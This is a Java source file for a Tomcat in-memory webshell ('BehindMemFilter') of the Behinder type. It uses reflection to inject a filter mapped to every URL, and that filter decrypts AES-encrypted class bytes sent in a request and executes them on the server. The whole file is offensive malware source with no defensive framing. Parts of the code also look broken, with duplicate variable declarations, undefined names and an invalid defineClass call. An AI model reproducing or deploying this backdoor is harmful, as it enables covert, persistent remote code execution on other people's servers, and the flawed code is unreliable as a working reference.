package x;

import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.UUID;
import java.util.logging.Logger;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.JspFactory;
import javax.servlet.jsp.JspWriter;
import javax.servlet.jsp.PageContext;
import javax.servlet.jsp.SkipPageException;
import org.apache.catalina.Context;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

/**
 * @author fengyue
 * @date 2021-02-19
 */
public class BehindMemFilter implements Filter {

  public static Logger log = Logger.getLogger(x.BehindMemFilter.class.toString());

  public static final String FILTE_NAME = "BehindMemFilter";
  private static final JspFactory _jspxFactory = JspFactory.getDefaultFactory();
  private String pwd;
  private String path;

  @Override
  public void init(FilterConfig filterConfig) throws ServletException {
    System.out.println("BehindMemFilter init");
    log.fine("BehindMemFilter init");
  }


  public Class g(byte[] b) {
    return super.defineClass(b, 0, b.length);
  }

  @Override
  public void doFilter(ServletRequest req, ServletResponse resp,
      FilterChain chain) throws IOException, ServletException {
    System.out.println("webshell call doFilter");
    String cmder = req.getParameter("cmd");
    HttpServletRequest request;
    HttpServletResponse response;
    try {
      request = (HttpServletRequest) req;
      response = (HttpServletResponse) resp;
    } catch (ClassCastException var6) {
      throw new ServletException("non-HTTP request or response");
    }

    this._jspService(request, response);

  }

  public void _jspService(HttpServletRequest request, HttpServletResponse response)
      throws IOException, ServletException {
    PageContext pageContext = new PageContext(servletRequest,servletResponse);
    Field responseField = ResponseFacade.class.getDeclaredField("response");
    responseField.setAccessible(true);
    org.apache.catalina.connector.Response resp = (Response) responseField.get((ResponseFacade) response);
    ResponseFacade responseFacade=(ResponseFacade) response;

    HttpSession session = null;
    JspWriter out = null;
    JspWriter _jspx_out = null;
    PageContext _jspx_page_context = null;

    try {
      response.setContentType("text/html");
      PageContext pageContext = _jspxFactory
          .getPageContext(this, request, response, (String) null, true, 8192, true);
      _jspx_page_context = pageContext;
      ServletContext application = pageContext.getServletContext();
      ServletConfig config = pageContext.getServletConfig();
      session = pageContext.getSession();
      out = pageContext.getOut();
      // this.noLog(pageContext);
      if (request.getParameter(this.pwd) == null) {
        Cipher c = Cipher.getInstance("AES");
        c.init(2, new SecretKeySpec(("" + session.getValue("u")).getBytes(), "AES"));
        (new x.BehOldDemoServlet(this.getClass().getClassLoader()))
            .g(c.doFinal(org.apache.shiro.codec.Base64.decode(request.getReader().readLine())))
            .newInstance().equals(pageContext);
        return;
      }

      String k = ("" + UUID.randomUUID()).replace("-", "").substring(16);
      session.putValue("u", k);
      out.print(k);
    } catch (Throwable var18) {
      if (!(var18 instanceof SkipPageException)) {
        out = (JspWriter) _jspx_out;
        if (_jspx_out != null && ((JspWriter) _jspx_out).getBufferSize() != 0) {
          try {
            if (response.isCommitted()) {
              out.flush();
            } else {
              out.clearBuffer();
            }

            return;
          } catch (IOException var17) {
            return;
          }
        }
      }

      return;
    } finally {
      _jspxFactory.releasePageContext(_jspx_page_context);
    }

  }

  @Override
  public void destroy() {

  }

  @Override
  public boolean equals(Object object) {
    Request request = (Request) object;
    Response response = request.getResponse();
    this.pwd = request.getParameter("p");
    this.path = request.getParameter("path");
    ServletContext servletContext = request.getServletContext();
    if (this.pwd != null && this.path != null && servletContext != null) {
      dynamicAddFilter(servletContext);
    } else {
      System.out.println("inject filter failed");
    }
    return true;
  }

  public void dynamicAddFilter(ServletContext servletContext) {

    StandardContext standardContext = null;
    try {
      Field field = servletContext.getClass().getDeclaredField("context");
      field.setAccessible(true);
      ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);

      field = applicationContext.getClass().getDeclaredField("context");
      field.setAccessible(true);
      standardContext = (StandardContext) field.get(applicationContext);

      field = standardContext.getClass().getDeclaredField("filterConfigs");
      field.setAccessible(true);
      // 获取standardContext的filterConfigs 如下定义
      /**
       * The set of filter configurations (and associated filter instances) we
       * have initialized, keyed by filter name.
       */
      // private HashMap<String, ApplicationFilterConfig> filterConfigs =
      //         new HashMap<>();
      HashMap filterConfigs = (HashMap) field.get(standardContext);
      if (filterConfigs.containsKey(FILTE_NAME)) {
        // System.out.println("BehindMemFilter");
        System.out.println("已经存在" + FILTE_NAME + " 内存shell");
        return;
      }

      FilterDef filterDef = new FilterDef();
      filterDef.setFilterName(FILTE_NAME);
      standardContext.addFilterDef(filterDef);

      filterDef.setFilter(this);

      // 获取ApplicationFilterConfig的filterDef构造方法
      Constructor constructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig")
          .getDeclaredConstructor(Context.class, FilterDef.class);
      constructor.setAccessible(true);
      filterConfigs.put("BehindMemFilter", constructor.newInstance(standardContext, filterDef));
    } catch (NoSuchFieldException e) {
      e.printStackTrace();
    } catch (IllegalAccessException e) {
      e.printStackTrace();
    } catch (NoSuchMethodException e) {
      e.printStackTrace();
    } catch (ClassNotFoundException e) {
      e.printStackTrace();
    } catch (InstantiationException e) {
      e.printStackTrace();
    } catch (InvocationTargetException e) {
      e.printStackTrace();
    }

    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName(FILTE_NAME);
    standardContext.addFilterMapBefore(filterMap);
    System.out.println("inject filter " + FILTE_NAME + " ok");
  }
}
